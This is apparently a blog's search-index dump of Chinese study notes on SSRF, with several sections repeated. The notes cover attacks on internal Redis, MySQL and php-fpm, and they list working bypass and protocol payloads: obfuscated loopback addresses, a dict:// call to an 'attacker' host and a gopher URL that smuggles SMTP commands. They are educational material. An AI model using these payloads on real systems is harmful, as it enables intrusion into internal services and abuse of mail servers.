对php文件做词法分析,语法分析,编译成opcode,并执行.最后关闭zend虚拟机.将执行结果返回给web服务器 web服务器收到返回结果后,将http相应传给浏览器 包含配置文件以后，后面紧跟一句 fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name 定义了一个SCRIPT_FILENAME,值是$document_root$fastcgi_script_name 重点看SCRIPT_FILENAME,这个就是nginx传给php-fpm的 nginx和php-fpm的数据交互,使用的是fast-cgi协议 fastcgi协议 fastcgi其实是一个通信协议,和http协议一样,都是进行数据交换的一个通道.http协议是浏览器和服务器中间件进行数据交换的协议,浏览器将http头和http体用某个规则组装成数据包,以tcp的方式发送到服务器中间件,服务器中间件按照规则将数据包解码,并按要求拿到用户需要的数据,再以http协议的规则打包返回给服务器. 可以使用伪造的fastcgi协议数据,与php-fpm交互,通过伪造script_filename的参数,来实现执行任意的PHP脚本文件 ssrf-\u003e控制服务端脚本请求本地php-fpm端口-\u003e伪造配置参数包含php://input数据-\u003e执行php://input内提交的代码 ","date":"2023-11-17","objectID":"/ssrf/:0:5","series":null,"tags":["web","notes"],"title":"SSRF","uri":"/ssrf/#2攻击mysql的3306端口"},{"categories":["web","notes"],"content":"\r0x5 ssrf漏洞利用\r1任意文件读取file:// 通过file协议读取本地文件，但只能读取已知文件名的文件 2内网资源探测利用控制的host字段，来扫描内网存活主机 若服务器监听127.0.0.1则这个端口只能被本机访问，若监听0.0.0.0，则这个端口可以被外网访问 3gopher协议扩展攻击面gopher:// 负责转发 1攻击redis的6379端口Redis一般运行在内网，使用者大多将其绑定在127.0.0.1:6379地址，切且一般为空口令，攻击者可以通过SSRF访问内网的redis，由于redis支持通过url形式的访问，来增加、删除、保存内容，所以，攻击者就可以首先增加一个PHP一句话木马的内容到redis，然后备份其文件，就可以将一句话木马保存到硬盘中，实现恶意代码写入 rides是一条指令执行一个行为，如果其中一条指令是错的，会继续读取下一条指令继续执行，所以如果我们能够控制报文的任意一行，就可以将其修改为redis指令，分批执行命令完成攻击 2攻击MySQL的3306端口攻击内网中的MySQL，我们需要了解其通信协议，MySQL分为服务端和客户端 由客户端连接服务端有四种方式： 1.Unix套接字 2.内存共享 3.命名管道 4.TCP/IP套接字 我们的攻击依靠第四种方式，MySQL客户端连接时： 1.需要密码认证，此时，服务器先发送salt，客户端使用salt进行加密后再验证 2.不需要密码验证，将直接使用上面第四种方式发送数据包 所以，这里攻击MySQL，需要在非交互条件下进行，一定只能攻击没有密码的MySQL服务器 3攻击fastcgi的9000端口 php-fpm是个中间件，在需要PHP解释器来处理php文本时会用到php-fpm.自从PHP5.3以后将php-fpm继承到php内核中，php-fpm提供了更好的php进程管理方式，可以有效控制内存的进程，可以平滑重载php配置 以我们经常执行访问的index.php?file=/etc/passwd为例: 浏览器发送访问index.php的请求到web服务器,比如nginx/apache web服务器将请求的url(index.php),参数(file=/etc/passwd)等等发送给专门的php解释器来执行,因为nginx/apache是只能处理静态文件(通过文件读取的方式) , 对于动态的php脚本, 需要专门的php-fpm中间件来解释执行 php-fpm收到了web服务器传递过来的各种参数后, 初始化zend虚拟机, 对php文件做词法分析,语法分析,编译成opcode,并执行.最后关闭zend虚拟机.将执行结果返回给web服务器 web服务器收到返回结果后,将http相应传给浏览器 包含配置文件以后，后面紧跟一句 fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name 定义了一个SCRIPT_FILENAME,值是$document_root$fastcgi_script_name 重点看SCRIPT_FILENAME,这个就是nginx传给php-fpm的 nginx和php-fpm的数据交互,使用的是fast-cgi协议 fastcgi协议 fastcgi其实是一个通信协议,和http协议一样,都是进行数据交换的一个通道.http协议是浏览器和服务器中间件进行数据交换的协议,浏览器将http头和http体用某个规则组装成数据包,以tcp的方式发送到服务器中间件,服务器中间件按照规则将数据包解码,并按要求拿到用户需要的数据,再以http协议的规则打包返回给服务器. 可以使用伪造的fastcgi协议数据,与php-fpm交互,通过伪造script_filename的参数,来实现执行任意的PHP脚本文件 ssrf-\u003e控制服务端脚本请求本地php-fpm端口-\u003e伪造配置参数包含php://input数据-\u003e执行php://input内提交的代码 ","date":"2023-11-17","objectID":"/ssrf/:0:5","series":null,"tags":["web","notes"],"title":"SSRF","uri":"/ssrf/#3攻击fastcgi的9000端口"},{"categories":["web","notes"],"content":"\r0x5 ssrf漏洞利用\r1任意文件读取file:// 通过file协议读取本地文件，但只能读取已知文件名的文件 2内网资源探测利用控制的host字段，来扫描内网存活主机 若服务器监听127.0.0.1则这个端口只能被本机访问，若监听0.0.0.0，则这个端口可以被外网访问 3gopher协议扩展攻击面gopher:// 负责转发 1攻击redis的6379端口Redis一般运行在内网，使用者大多将其绑定在127.0.0.1:6379地址，切且一般为空口令，攻击者可以通过SSRF访问内网的redis，由于redis支持通过url形式的访问，来增加、删除、保存内容，所以，攻击者就可以首先增加一个PHP一句话木马的内容到redis，然后备份其文件，就可以将一句话木马保存到硬盘中，实现恶意代码写入 rides是一条指令执行一个行为，如果其中一条指令是错的，会继续读取下一条指令继续执行，所以如果我们能够控制报文的任意一行，就可以将其修改为redis指令，分批执行命令完成攻击 2攻击MySQL的3306端口攻击内网中的MySQL，我们需要了解其通信协议，MySQL分为服务端和客户端 由客户端连接服务端有四种方式： 1.Unix套接字 2.内存共享 3.命名管道 4.TCP/IP套接字 我们的攻击依靠第四种方式，MySQL客户端连接时： 1.需要密码认证，此时，服务器先发送salt，客户端使用salt进行加密后再验证 2.不需要密码验证，将直接使用上面第四种方式发送数据包 所以，这里攻击MySQL，需要在非交互条件下进行，一定只能攻击没有密码的MySQL服务器 3攻击fastcgi的9000端口 php-fpm是个中间件，在需要PHP解释器来处理php文本时会用到php-fpm.自从PHP5.3以后将php-fpm继承到php内核中，php-fpm提供了更好的php进程管理方式，可以有效控制内存的进程，可以平滑重载php配置 以我们经常执行访问的index.php?file=/etc/passwd为例: 浏览器发送访问index.php的请求到web服务器,比如nginx/apache web服务器将请求的url(index.php),参数(file=/etc/passwd)等等发送给专门的php解释器来执行,因为nginx/apache是只能处理静态文件(通过文件读取的方式) , 对于动态的php脚本, 需要专门的php-fpm中间件来解释执行 php-fpm收到了web服务器传递过来的各种参数后, 初始化zend虚拟机, 对php文件做词法分析,语法分析,编译成opcode,并执行.最后关闭zend虚拟机.将执行结果返回给web服务器 web服务器收到返回结果后,将http相应传给浏览器 包含配置文件以后，后面紧跟一句 fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name 定义了一个SCRIPT_FILENAME,值是$document_root$fastcgi_script_name 重点看SCRIPT_FILENAME,这个就是nginx传给php-fpm的 nginx和php-fpm的数据交互,使用的是fast-cgi协议 fastcgi协议 fastcgi其实是一个通信协议,和http协议一样,都是进行数据交换的一个通道.http协议是浏览器和服务器中间件进行数据交换的协议,浏览器将http头和http体用某个规则组装成数据包,以tcp的方式发送到服务器中间件,服务器中间件按照规则将数据包解码,并按要求拿到用户需要的数据,再以http协议的规则打包返回给服务器. 可以使用伪造的fastcgi协议数据,与php-fpm交互,通过伪造script_filename的参数,来实现执行任意的PHP脚本文件 ssrf-\u003e控制服务端脚本请求本地php-fpm端口-\u003e伪造配置参数包含php://input数据-\u003e执行php://input内提交的代码 ","date":"2023-11-17","objectID":"/ssrf/:0:5","series":null,"tags":["web","notes"],"title":"SSRF","uri":"/ssrf/#fastcgi协议"},{"categories":["web","notes"],"content":"\r0x6 url结构url结构遵循RFC1738标准，结构如下： URI=scheme:[//authority]path[?query][#fragment] 其中authority可以表示为 [userinfo@]host[:port] scheme由一串大小写不敏感的字符组成，表示获取资源所需要的协议，俗称协议头 authority中的userinfo是一个可选项，一般HTTP使用匿名形式来获取数据，如果需要身份验证，格式为username:password@来表示 host是指在哪个服务器上获取资源，一般所见可以是域名形式，也可以是IP形式，包括IPv4和IPv6 port为服务器端口，http协议默认为80端口，而HTTPS协议默认是443端口，ftp协议是21端口，访问时使用默认端口，可以将端口省略 path为资源路径，一般用/进行分层，可以是基于文件的目录，也可以是基于路由的分层 query是指查询字符串，这里是可以动态改变的，我们前面也学过，可以用key=value形式的，也可以用index.php/Home/User/Index形式的pathinfo格式 fragment表示页面上的片段ID，一般不会跟随浏览器发送到服务器上，页面中一般表示为锚点，用#开头，所以我们在GET请求中，如果要发送#，就必须进行urlencode编码，否则就会认为是锚点 ","date":"2023-11-17","objectID":"/ssrf/:0:6","series":null,"tags":["web","notes"],"title":"SSRF","uri":"/ssrf/#0x6-url结构"},{"categories":["web","notes"],"content":"\r0x7 SSRF绕过\r1、攻击本地 http://127.0.0.1:80 http://localhost:22 2、利用[::] 利用[::]绕过localhost http://[::]:80/ \u003e\u003e\u003e http://127.0.0.1 也有看到利用http://0000::1:80/的，但是我测试未成功 3、利用@ http://example.com@127.0.0.1 4、利用短地址 http://dwz.cn/11SMa \u003e\u003e\u003e http://127.0.0.1 5、利用特殊域名利用的原理是DNS解析 http://127.0.0.1.xip.io/ http://www.owasp.org.127.0.0.1.xip.io/ 6、利用DNS解析在域名上设置A记录，指向127.0.1 7、利用上传 也不一定是上传，我也说不清，自己体会 -.- 修改\"type=file\"为\"type=url\" 比如： 上传图片处修改上传，将图片文件修改为URL，即可能触发SSRF 8、利用Enclosed alphanumerics 利用Enclosed alphanumerics ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ \u003e\u003e\u003e example.com List: ① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿ 9、利用句号 127。0。0。1 \u003e\u003e\u003e 127.0.0.1 10、利用进制转换 可以是十六进制，八进制等。 115.239.210.26 \u003e\u003e\u003e 16373751032 首先把这四段数字给分别转成16进制，结果：73 ef d2 1a 然后把 73efd21a 这十六进制一起转换成8进制 记得访问的时候加0表示使用八进制(可以是一个0也可以是多个0 跟XSS中多加几个0来绕过过滤一样)，十六进制加0x http://127.0.0.1 \u003e\u003e\u003e http://0177.0.0.1/ http://127.0.0.1 \u003e\u003e\u003e http://2130706433/ http://192.168.0.1 \u003e\u003e\u003e http://3232235521/ http://192.168.1.1 \u003e\u003e\u003e http://3232235777/ 11、利用特殊地址 http://0/ 12、利用协议 Dict:// dict://\u003cuser-auth\u003e@\u003chost\u003e:\u003cport\u003e/d:\u003cword\u003e ssrf.php?url=dict://attacker:11111/ SFTP:// ssrf.php?url=sftp://example.com:11111/ TFTP:// ssrf.php?url=tftp://example.com:12346/TESTUDPPACKET LDAP:// ssrf.php?url=ldap://localhost:11211/%0astats%0aquit Gopher:// ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a 13、使用组合各种绕过进行自由组合即可 ","date":"2023-11-17","objectID":"/ssrf/:0:7","series":null,"tags":["web","notes"],"title":"SSRF","uri":"/ssrf/#0x7-ssrf绕过"},{"categories":["web","notes"],"content":"\r0x7 SSRF绕过\r1、攻击本地 http://127.0.0.1:80 http://localhost:22 2、利用[::] 利用[::]绕过localhost http://[::]:80/ \u003e\u003e\u003e http://127.0.0.1 也有看到利用http://0000::1:80/的，但是我测试未成功 3、利用@ http://example.com@127.0.0.1 4、利用短地址 http://dwz.cn/11SMa \u003e\u003e\u003e http://127.0.0.1 5、利用特殊域名利用的原理是DNS解析 http://127.0.0.1.xip.io/ http://www.owasp.org.127.0.0.1.xip.io/ 6、利用DNS解析在域名上设置A记录，指向127.0.1 7、利用上传 也不一定是上传，我也说不清，自己体会 -.- 修改\"type=file\"为\"type=url\" 比如： 上传图片处修改上传，将图片文件修改为URL，即可能触发SSRF 8、利用Enclosed alphanumerics 利用Enclosed alphanumerics ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ \u003e\u003e\u003e example.com List: ① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿ 9、利用句号 127。0。0。1 \u003e\u003e\u003e 127.0.0.1 10、利用进制转换 可以是十六进制，八进制等。 115.239.210.26 \u003e\u003e\u003e 16373751032 首先把这四段数字给分别转成16进制，结果：73 ef d2 1a 然后把 73efd21a 这十六进制一起转换成8进制 记得访问的时候加0表示使用八进制(可以是一个0也可以是多个0 跟XSS中多加几个0来绕过过滤一样)，十六进制加0x http://127.0.0.1 \u003e\u003e\u003e http://0177.0.0.1/ http://127.0.0.1 \u003e\u003e\u003e http://2130706433/ http://192.168.0.1 \u003e\u003e\u003e http://3232235521/ http://192.168.1.1 \u003e\u003e\u003e http://3232235777/ 11、利用特殊地址 http://0/ 12、利用协议 Dict:// dict://@:/d: ssrf.php?url=dict://attacker:11111/ SFTP:// ssrf.php?url=sftp://example.com:11111/ TFTP:// ssrf.php?url=tftp://example.com:12346/TESTUDPPACKET LDAP:// ssrf.php?url=ldap://localhost:11211/%0astats%0aquit Gopher:// ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a 13、使用组合各种绕过进行自由组合即可 ","date":"2023-11-17","objectID":"/ssrf/:0:7","series":null,"tags":["web","notes"],"title":"SSRF","uri":"/ssrf/#1攻击本地"},{"categories":["web","notes"],"content":"\r0x7 SSRF绕过\r1、攻击本地 http://127.0.0.1:80 http://localhost:22 2、利用[::] 利用[::]绕过localhost http://[::]:80/ \u003e\u003e\u003e http://127.0.0.1 也有看到利用http://0000::1:80/的，但是我测试未成功 3、利用@ http://example.com@127.0.0.1 4、利用短地址 http://dwz.cn/11SMa \u003e\u003e\u003e http://127.0.0.1 5、利用特殊域名利用的原理是DNS解析 http://127.0.0.1.xip.io/ http://www.owasp.org.127.0.0.1.xip.io/ 6、利用DNS解析在域名上设置A记录，指向127.0.1 7、利用上传 也不一定是上传，我也说不清，自己体会 -.- 修改\"type=file\"为\"type=url\" 比如： 上传图片处修改上传，将图片文件修改为URL，即可能触发SSRF 8、利用Enclosed alphanumerics 利用Enclosed alphanumerics ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ \u003e\u003e\u003e example.com List: ① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿ 9、利用句号 127。0。0。1 \u003e\u003e\u003e 127.0.0.1 10、利用进制转换 可以是十六进制，八进制等。 115.239.210.26 \u003e\u003e\u003e 16373751032 首先把这四段数字给分别转成16进制，结果：73 ef d2 1a 然后把 73efd21a 这十六进制一起转换成8进制 记得访问的时候加0表示使用八进制(可以是一个0也可以是多个0 跟XSS中多加几个0来绕过过滤一样)，十六进制加0x http://127.0.0.1 \u003e\u003e\u003e http://0177.0.0.1/ http://127.0.0.1 \u003e\u003e\u003e http://2130706433/ http://192.168.0.1 \u003e\u003e\u003e http://3232235521/ http://192.168.1.1 \u003e\u003e\u003e http://3232235777/ 11、利用特殊地址 http://0/ 12、利用协议 Dict:// dict://@:/d: ssrf.php?url=dict://attacker:11111/ SFTP:// ssrf.php?url=sftp://example.com:11111/ TFTP:// ssrf.php?url=tftp://example.com:12346/TESTUDPPACKET LDAP:// ssrf.php?url=ldap://localhost:11211/%0astats%0aquit Gopher:// ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a 13、使用组合各种绕过进行自由组合即可 ","date":"2023-11-17","objectID":"/ssrf/:0:7","series":null,"tags":["web","notes"],"title":"SSRF","uri":"/ssrf/#2利用"},{"categories":["web","notes"],"content":"\r0x7 SSRF绕过\r1、攻击本地 http://127.0.0.1:80 http://localhost:22 2、利用[::] 利用[::]绕过localhost http://[::]:80/ \u003e\u003e\u003e http://127.0.0.1 也有看到利用http://0000::1:80/的，但是我测试未成功 3、利用@ http://example.com@127.0.0.1 4、利用短地址 http://dwz.cn/11SMa \u003e\u003e\u003e http://127.0.0.1 5、利用特殊域名利用的原理是DNS解析 http://127.0.0.1.xip.io/ http://www.owasp.org.127.0.0.1.xip.io/ 6、利用DNS解析在域名上设置A记录，指向127.0.1 7、利用上传 也不一定是上传，我也说不清，自己体会 -.- 修改\"type=file\"为\"type=url\" 比如： 上传图片处修改上传，将图片文件修改为URL，即可能触发SSRF 8、利用Enclosed alphanumerics 利用Enclosed alphanumerics ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ \u003e\u003e\u003e example.com List: ① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿ 9、利用句号 127。0。0。1 \u003e\u003e\u003e 127.0.0.1 10、利用进制转换 可以是十六进制，八进制等。 115.239.210.26 \u003e\u003e\u003e 16373751032 首先把这四段数字给分别转成16进制，结果：73 ef d2 1a 然后把 73efd21a 这十六进制一起转换成8进制 记得访问的时候加0表示使用八进制(可以是一个0也可以是多个0 跟XSS中多加几个0来绕过过滤一样)，十六进制加0x http://127.0.0.1 \u003e\u003e\u003e http://0177.0.0.1/ http://127.0.0.1 \u003e\u003e\u003e http://2130706433/ http://192.168.0.1 \u003e\u003e\u003e http://3232235521/ http://192.168.1.1 \u003e\u003e\u003e http://3232235777/ 11、利用特殊地址 http://0/ 12、利用协议 Dict:// dict://@:/d: ssrf.php?url=dict://attacker:11111/ SFTP:// ssrf.php?url=sftp://example.com:11111/ TFTP:// ssrf.php?url=tftp://example.com:12346/TESTUDPPACKET LDAP:// ssrf.php?url=ldap://localhost:11211/%0astats%0aquit Gopher:// ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a 13、使用组合各种绕过进行自由组合即可 ","date":"2023-11-17","objectID":"/ssrf/:0:7","series":null,"tags":["web","notes"],"title":"SSRF","uri":"/ssrf/#3利用"},{"categories":["web","notes"],"content":"\r0x7 SSRF绕过\r1、攻击本地 http://127.0.0.1:80 http://localhost:22 2、利用[::] 利用[::]绕过localhost http://[::]:80/ \u003e\u003e\u003e http://127.0.0.1 也有看到利用http://0000::1:80/的，但是我测试未成功 3、利用@ http://example.com@127.0.0.1 4、利用短地址 http://dwz.cn/11SMa \u003e\u003e\u003e http://127.0.0.1 5、利用特殊域名利用的原理是DNS解析 http://127.0.0.1.xip.io/ http://www.owasp.org.127.0.0.1.xip.io/ 6、利用DNS解析在域名上设置A记录，指向127.0.1 7、利用上传 也不一定是上传，我也说不清，自己体会 -.- 修改\"type=file\"为\"type=url\" 比如： 上传图片处修改上传，将图片文件修改为URL，即可能触发SSRF 8、利用Enclosed alphanumerics 利用Enclosed alphanumerics ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ \u003e\u003e\u003e example.com List: ① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿ 9、利用句号 127。0。0。1 \u003e\u003e\u003e 127.0.0.1 10、利用进制转换 可以是十六进制，八进制等。 115.239.210.26 \u003e\u003e\u003e 16373751032 首先把这四段数字给分别转成16进制，结果：73 ef d2 1a 然后把 73efd21a 这十六进制一起转换成8进制 记得访问的时候加0表示使用八进制(可以是一个0也可以是多个0 跟XSS中多加几个0来绕过过滤一样)，十六进制加0x http://127.0.0.1 \u003e\u003e\u003e http://0177.0.0.1/ http://127.0.0.1 \u003e\u003e\u003e http://2130706433/ http://192.168.0.1 \u003e\u003e\u003e http://3232235521/ http://192.168.1.1 \u003e\u003e\u003e http://3232235777/ 11、利用特殊地址 http://0/ 12、利用协议 Dict:// dict://@:/d: ssrf.php?url=dict://attacker:11111/ SFTP:// ssrf.php?url=sftp://example.com:11111/ TFTP:// ssrf.php?url=tftp://example.com:12346/TESTUDPPACKET LDAP:// ssrf.php?url=ldap://localhost:11211/%0astats%0aquit Gopher:// ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a 13、使用组合各种绕过进行自由组合即可 